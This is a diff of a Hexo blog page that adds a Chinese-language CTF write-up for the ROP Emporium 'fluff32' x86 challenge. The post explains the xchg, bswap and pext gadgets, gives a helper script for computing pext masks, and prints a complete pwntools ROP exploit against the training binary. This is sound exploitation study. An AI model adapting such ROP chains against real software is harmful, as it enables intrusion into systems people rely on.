@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 
 
-<html theme="dark" showBanner="true" hasBanner="true" > 
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
 <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
 <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
 <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
@@ -25,19 +25,26 @@
   
 
   
-  <title>Archives: 2024/4 | Hexo</title>
+  <title>Ropemporium-6-x86 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
   <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2024/04/index.html">
+  <meta name="description" content="如果知道这几个汇编指令的情况下这题其实还算是蛮简单，问题指令利用部分学到了xchg和bswap以及pext，自己做出来了很开心o(￣▽￣)ブ。 123&#x2F;&#x2F;ecx flag.txt address0x08048558 : pop ecx ; bswap ecx ; ret0x08048555 : xchg byte ptr [ecx], dl ; ret xchg例子 这里引用的https:&#x2F;&#x2F;ww">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ropemporium-6-x86">
+<meta property="og:url" content="http://example.com/2024/05/13/Ropemporium-6-x86/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="如果知道这几个汇编指令的情况下这题其实还算是蛮简单，问题指令利用部分学到了xchg和bswap以及pext，自己做出来了很开心o(￣▽￣)ブ。 123&#x2F;&#x2F;ecx flag.txt address0x08048558 : pop ecx ; bswap ecx ; ret0x08048555 : xchg byte ptr [ecx], dl ; ret xchg例子 这里引用的https:&#x2F;&#x2F;ww">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wpimages/2024/ctf/pwn/ropemporium-6.jpg">
+<meta property="article:published_time" content="2024-05-13T10:01:29.000Z">
+<meta property="article:modified_time" content="2024-05-14T04:12:02.168Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wpimages/2024/ctf/pwn/ropemporium-6.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -242,63 +249,115 @@
     <div id="content-body">
        
 
-<div class="archive-main-card">
-    <div class="archive-top">
-      <div class="main-title-bar">
-        <div class="main-title-dot"></div>
-        <h1 class="article-title">Archives</h1>
-      </div>    
-    </div>
+
+<article id="post-Ropemporium-6-x86" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
     
+<div class="article-gallery">
+  <div class="article-gallery-photos">
     
-      
-      
-        
-        <div class="year-line">
-            <div class="year-num">2024</div>
-            <div class="dot-wrapper">
-                <div class="dot"></div>
-            </div>
-            <div class="article-count">2 articles</div>
-        </div>
-      
-      <a class="archive-article-link" href="/2024/04/26/zentao-20240426%E6%9C%AA%E6%8E%88%E6%9D%83-poc/" title="zentao-20240426未授权-poc">
-        <div class="date">04-26</div>
-        <div class="line">
-            <div class="dot"></div>
-        </div>
-        <div class="title">
-            <div class="title-inner">
-                
-                    zentao-20240426未授权-poc
-                
-            </div>
-        </div>
-        <div class="tags">
-            #poc
-        </div>
-      </a>
-    
-      
-      
-      <a class="archive-article-link" href="/2024/04/26/box-runner-wp/" title="【season-5】 htb Runner wp">
-        <div class="date">04-26</div>
-        <div class="line">
-            <div class="dot"></div>
-        </div>
-        <div class="title">
-            <div class="title-inner">
-                
-                    【season-5】 htb Runner wp
-                
-            </div>
-        </div>
-        <div class="tags">
-            #wp
-        </div>
+      <a class="article-gallery-img" rel="gallery_clw5vnv4j0001g8kyhj7z9hi2">
+        <img src="/wpimages/2024/ctf/pwn/ropemporium-6.jpg" itemprop="image">
       </a>
     
   </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        Ropemporium-6-x86
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-05-13T10:01:29.000Z" itemprop="datePublished">2024-05-13</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            1.8k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>如果知道这几个汇编指令的情况下这题其实还算是蛮简单，问题指令利用部分学到了<code>xchg</code>和<code>bswap</code>以及<code>pext</code>，自己做出来了很开心o(<em>￣▽￣</em>)ブ。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//ecx flag.txt address</span><br><span class="line">0x08048558 : pop ecx ; bswap ecx ; ret</span><br><span class="line">0x08048555 : xchg byte ptr [ecx], dl ; ret</span><br></pre></td></tr></table></figure>
+<p><code>xchg</code>例子 这里引用的<a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/xchg">https://www.felixcloutier.com/x86/xchg</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TEMP := DEST;</span><br><span class="line">DEST := SRC;</span><br><span class="line">SRC := TEMP;</span><br></pre></td></tr></table></figure>
+
+<p><code>bswap</code>则是大小端序之间互相转换</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TEMP := DEST</span><br><span class="line">IF 64-bit mode AND OperandSize = 64</span><br><span class="line">    THEN</span><br><span class="line">        DEST[7:0] := TEMP[63:56];</span><br><span class="line">        DEST[15:8] := TEMP[55:48];</span><br><span class="line">        DEST[23:16] := TEMP[47:40];</span><br><span class="line">        DEST[31:24] := TEMP[39:32];</span><br><span class="line">        DEST[39:32] := TEMP[31:24];</span><br><span class="line">        DEST[47:40] := TEMP[23:16];</span><br><span class="line">        DEST[55:48] := TEMP[15:8];</span><br><span class="line">        DEST[63:56] := TEMP[7:0];</span><br><span class="line">    ELSE</span><br><span class="line">        DEST[7:0] := TEMP[31:24];</span><br><span class="line">        DEST[15:8] := TEMP[23:16];</span><br><span class="line">        DEST[23:16] := TEMP[15:8];</span><br><span class="line">        DEST[31:24] := TEMP[7:0];</span><br><span class="line">FI;</span><br></pre></td></tr></table></figure>
+
+<p>为了通过pext给edx赋值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x08048543      89e8                   mov     eax, ebp</span><br><span class="line">0x08048545      bbbababab0             mov     ebx, 0xb0bababa</span><br><span class="line">0x0804854a      c4e262f5d0             pext    edx, ebx, eax</span><br></pre></td></tr></table></figure>
+
+<p>写了个脚本..手算pext给edx赋值感觉还是属于沾点缺心眼</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;10110000101110101011101010111010&quot;</span>[::-<span class="number">1</span>]</span><br><span class="line">flag=<span class="string">&quot;flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> flag:</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    b = <span class="string">&quot;&quot;</span></span><br><span class="line">    flagbin=<span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(l)))[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flagbin)):</span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(a) <span class="keyword">and</span> flagbin[i] != a[j]:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">            b +=<span class="string">&quot;0&quot;</span></span><br><span class="line">        b += <span class="string">&quot;1&quot;</span></span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line">    c.append(<span class="built_in">hex</span>(<span class="built_in">int</span>(b[::-<span class="number">1</span>],<span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
+
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(terminal=[&#x27;tmux&#x27;,&#x27;new-window&#x27;])</span><br><span class="line">p=gdb.debug(&#x27;./fluff32&#x27;,&quot;b pwnme&quot;)</span><br><span class="line">context.bits=32</span><br><span class="line"></span><br><span class="line">c=b&#x27;A&#x27;*44</span><br><span class="line"></span><br><span class="line">data=0x0804a018</span><br><span class="line">bss=0x0804a020</span><br><span class="line"></span><br><span class="line">flag=[p32(0xb4b), p32(0x2dd), p32(0x1d46), p32(0xb5a), p32(0xdb), p32(0xacd), p32(0x1ac5), p32(0xacd)]</span><br><span class="line"></span><br><span class="line">pop_ebp=0x080485bb</span><br><span class="line">pext_edx=0x08048543</span><br><span class="line"></span><br><span class="line">pop_ecx_bswap_ecx=0x08048558</span><br><span class="line">xchg_bytecx_dl=0x08048555</span><br><span class="line"></span><br><span class="line">ret=p32(0x08048382)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print_file=0x080483d0</span><br><span class="line"></span><br><span class="line">payload=c</span><br><span class="line"></span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    payload+=p32(pop_ebp)+flag[i]</span><br><span class="line">    payload+=p32(pext_edx)</span><br><span class="line">    payload+=p32(pop_ecx_bswap_ecx)+pack(bss+i,endian=&quot;big&quot;)</span><br><span class="line">    payload+=p32(xchg_bytecx_dl)</span><br><span class="line"></span><br><span class="line">payload+=p32(print_file)+p32(0x0)+p32(bss)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/04/26/zentao-20240426%E6%9C%AA%E6%8E%88%E6%9D%83-poc/"
+      title="zentao-20240426未授权-poc"
+     >
+
+    <p class="title-text">
+      
+        zentao-20240426未授权-poc
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
     </div>
     <div id="footer-wrapper">
       <footer id="footer">
